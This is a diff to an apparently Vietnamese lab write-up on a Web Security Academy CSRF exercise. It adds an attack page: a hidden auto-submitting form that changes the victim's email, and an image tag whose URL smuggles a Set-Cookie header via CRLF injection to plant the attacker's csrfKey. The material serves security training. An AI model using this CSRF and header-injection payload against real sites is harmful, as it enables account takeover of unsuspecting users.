@@ -137,5 +137,11 @@ Ta mở thêm tài khoản của carlos và tráo đổi 2 thành phần của 2
 Và cái csrfKey này là cố định chỉ có csrf token bị thay đổi nên ta sẽ dàn dựng tấn công như sau: 
 
 ```
+    <form method="POST" action="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/my-account/change-email" >
+      <input type="hidden" name="email" value="1manhhuy2002@gmail.com" />
+      <input type="hidden" name="csrf" value="Xs7dJWL7tw1a1xPD1Hkw1cMXlZJ3BNGS" />
+      <input type="submit" value="Submit request" />
+    </form>
+<img src="https://0a710093043d2ec2c415d20700be0075.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=oOuXqmhVhMGrJCSP7oTLu7ypF8roXQzh%3b%20SameSite=None" onerror="document.forms[0].submit()">
 
 ```
